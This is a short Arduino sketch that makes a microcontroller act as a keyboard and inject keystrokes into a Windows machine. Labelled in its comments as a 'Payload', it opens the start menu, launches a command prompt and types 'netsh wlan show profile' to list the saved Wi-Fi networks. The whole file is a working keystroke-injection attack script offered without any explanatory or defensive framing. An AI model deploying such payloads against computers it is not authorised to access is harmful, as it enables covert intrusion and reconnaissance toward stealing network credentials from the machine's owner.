#include <Keyboard.h>

void setup(){
  // Start Keyboard and Mouse
  Keyboard.begin();
  // Start Payload
  delay(3000);
  Keyboard.write(KEY_LEFT_GUI);
  delay(2000);
  Keyboard.print("cmd");
  delay(1000);
  Keyboard.write(KEY_RETURN);
  delay(1000);
  Keyboard.print("netsh wlan show profile");
  delay(100);
  Keyboard.write(KEY_RETURN);
}

// Unused
void loop() {}
